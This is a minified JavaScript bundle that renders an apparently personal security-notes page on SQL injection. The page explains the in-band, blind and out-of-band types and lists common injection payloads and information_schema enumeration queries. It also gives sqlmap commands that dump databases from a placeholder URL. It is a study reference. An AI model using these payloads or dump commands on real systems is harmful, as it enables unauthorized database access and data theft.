"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[8964],{63249:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>r,contentTitle:()=>l,default:()=>h,frontMatter:()=>i,metadata:()=>o,toc:()=>c});var a=s(74848),t=s(28453);const i={},l="\ud83d\udc89 SQLi",o={id:"security/web/sql-injection",title:"\ud83d\udc89 SQLi",description:"SQL injections (SQLi) is a type of vulnerability that allows the execution of malicious queries.",source:"@site/docs/security/05-web/sql-injection.md",sourceDirName:"security/05-web",slug:"/security/web/sql-injection",permalink:"/docs/security/web/sql-injection",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/05-web/sql-injection.md",tags:[],version:"current",frontMatter:{},sidebar:"securitySidebar",previous:{title:"\ud83d\udce9 Serialization",permalink:"/docs/security/web/serialization"},next:{title:"\ud83d\udd28 SSRF",permalink:"/docs/security/web/ssrf"}},r={},c=[{value:"In-Band SQL Injection",id:"in-band-sql-injection",level:2},{value:"Blind SQLi",id:"blind-sqli",level:2},{value:"Out-of-band SQLi",id:"out-of-band-sqli",level:2},{value:"Warnings",id:"warnings",level:2},{value:"SQL is not case sensitive",id:"sql-is-not-case-sensitive",level:3},{value:"Comments",id:"comments",level:3},{value:"Quotes",id:"quotes",level:3},{value:"sqlmap",id:"sqlmap",level:2},{value:"sqlmap over websockets",id:"sqlmap-over-websockets",level:3}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...e.components},{Gist:i,Image:l}=n;return i||u("Gist",!0),l||u("Image",!0),(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"-sqli",children:"\ud83d\udc89 SQLi"}),"\n",(0,a.jsx)(n.p,{children:"SQL injections (SQLi) is a type of vulnerability that allows the execution of malicious queries."}),"\n",(0,a.jsx)(n.p,{children:"Types of SQLi:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"In-Band SQLi"}),"\n",(0,a.jsx)(n.li,{children:"Blind SQLi"}),"\n",(0,a.jsx)(n.li,{children:"Out-of-band SQLi"}),"\n"]}),"\n",(0,a.jsx)(n.h2,{id:"in-band-sql-injection",children:"In-Band SQL Injection"}),"\n",(0,a.jsx)(n.p,{children:"In-band SQLi are based on the output of the query that is showed directly to the user."}),"\n",(0,a.jsx)(n.p,{children:"This attack allows to extract easily a lot of data from the database."}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"Union based: the attacker uses the UNION operator to read data from additional tables."}),"\n",(0,a.jsx)(n.li,{children:"Error based: the server returns the database errors allowing an easier interaction for the attacker."}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"Common payloads"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"OR 1 = 1; --\nUNION 1,2,3; --\n"})}),"\n",(0,a.jsx)(n.h2,{id:"blind-sqli",children:"Blind SQLi"}),"\n",(0,a.jsx)(n.p,{children:"In blind SQLi no direct feedbacks are returned from the server."}),"\n",(0,a.jsx)(n.p,{children:"There are different ways to make a blind SQLi:"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"Authentication bypass: the output is not needed because the goal is to bypass a login form."}),"\n",(0,a.jsx)(n.li,{children:"Boolean based: the server replies only with a boolean."}),"\n",(0,a.jsx)(n.li,{children:"Time based: based on the sleep function and the time needed by the query to complete."}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"Common payloads"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"UNION SELECT SLEEP(5);--\nWHERE database() LIKE 'a%'\nFROM information_schema.tables WHERE table_schema = 'DATABASE_NAME' and table_name like 'a%';\nFROM information_schema.columns WHERE table_schema='DATABASE_NAME' and table_name='DATABASE_TABLE' and column_name like 'a%';\n"})}),"\n",(0,a.jsx)(n.p,{children:"Enumeratation example"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"WHERE database() LIKE 'a%'\nWHERE database() LIKE 'b%'\nWHERE database() LIKE 'c%'\nWHERE database() LIKE 'd%'\n\nWHERE database() LIKE 'da%'\nWHERE database() LIKE 'db%'\n\nWHERE database() LIKE 'dba%'\nWHERE database() LIKE 'dbb%'\n...\n"})}),"\n",(0,a.jsx)(n.h2,{id:"out-of-band-sqli",children:"Out-of-band SQLi"}),"\n",(0,a.jsx)(n.p,{children:"Out-Of-Band attacks are based on two different channels: one for the injection and the other to check the output."}),"\n",(0,a.jsx)(n.h2,{id:"warnings",children:"Warnings"}),"\n",(0,a.jsx)(n.admonition,{type:"caution",children:(0,a.jsx)(n.p,{children:"This is a list of few important warnings about SQL queries and SQLi."})}),"\n",(0,a.jsx)(n.h3,{id:"sql-is-not-case-sensitive",children:"SQL is not case sensitive"}),"\n",(0,a.jsx)(n.p,{children:"SQL clauses and schema values are not case sensitive."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"-- all equals\nSELECT * FROM USERS WHERE USERNAME='admin';\nselect * from users where username='admin';\nSelect * From Users Where Username='admin';\nSeLeCt * FrOm UsErs WhErE UsErNaMe='admin';\n"})}),"\n",(0,a.jsx)(n.h3,{id:"comments",children:"Comments"}),"\n",(0,a.jsx)(n.p,{children:"A single space after the double slash could be needed.\nFor example, in MySQL is mandatory."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"; -- this is a comment\n; --this could not be a comment\n"})}),"\n",(0,a.jsx)(n.h3,{id:"quotes",children:"Quotes"}),"\n",(0,a.jsx)(n.p,{children:"Single quotes are not always interchangeable with double quotes.\nFor example, PostgreSQL allows only single quotes for values and double quotes for schema names."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:'select "column" from "table" where "column"=\'value\';\n'})}),"\n",(0,a.jsx)(n.h2,{id:"sqlmap",children:"sqlmap"}),"\n",(0,a.jsx)(l,{src:s(88445).A}),"\n",(0,a.jsxs)(n.p,{children:["Use ",(0,a.jsx)(n.code,{children:"-u"})," to define the target url and ",(0,a.jsx)(n.code,{children:"--batch"})," to use the default behavior without asking for input."]}),"\n",(0,a.jsxs)(n.p,{children:["In the next commands, ",(0,a.jsx)(n.code,{children:"id"})," is a query parameter that is vulnerable to SQL injection."]}),"\n",(0,a.jsx)(n.p,{children:"Enumerate databases."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://website.com/?id=1" --batch --dbs\n'})}),"\n",(0,a.jsx)(n.p,{children:"Enumerate tables of a specific database."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://website.com/?id=1" --batch --tables -D db_name\n'})}),"\n",(0,a.jsx)(n.p,{children:"Enumerate tables content of a specific database."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name\n'})}),"\n",(0,a.jsx)(n.p,{children:"Enumerate content by specifying table, column, and database."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:'sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name -T table_name -C col_name\n'})}),"\n",(0,a.jsx)(n.h3,{id:"sqlmap-over-websockets",children:"sqlmap over websockets"}),"\n",(0,a.jsx)(n.p,{children:"sqlmap may not support all types of requests, including those made over websockets. Also, working with complex targets can sometimes be cumbersome using sqlmap alone."}),"\n",(0,a.jsx)(n.p,{children:"To simplify the process, it is possible to set up a fake server as an intermediary. In this way, sqlmap would make a request to the fake server using a common format, and the fake server would then make the more complex request to the actual target."}),"\n",(0,a.jsx)(l,{src:s(51497).A}),"\n",(0,a.jsx)(i,{id:"4adec402e51df2bf3e35066172abaebf"})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}function u(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}},88445:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/sqlmap-19ab36f4fcb837c1a823a44ad989cd4f.png"},51497:(e,n,s)=>{s.d(n,{A:()=>a});const a=s.p+"assets/images/sqlmap_over_websockets-001b1de5593b04c3c09f79857073d13a.png"},28453:(e,n,s)=>{s.d(n,{R:()=>l,x:()=>o});var a=s(96540);const t={},i=a.createContext(t);function l(e){const n=a.useContext(i);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:l(e.components),a.createElement(i.Provider,{value:n},e.children)}}}]);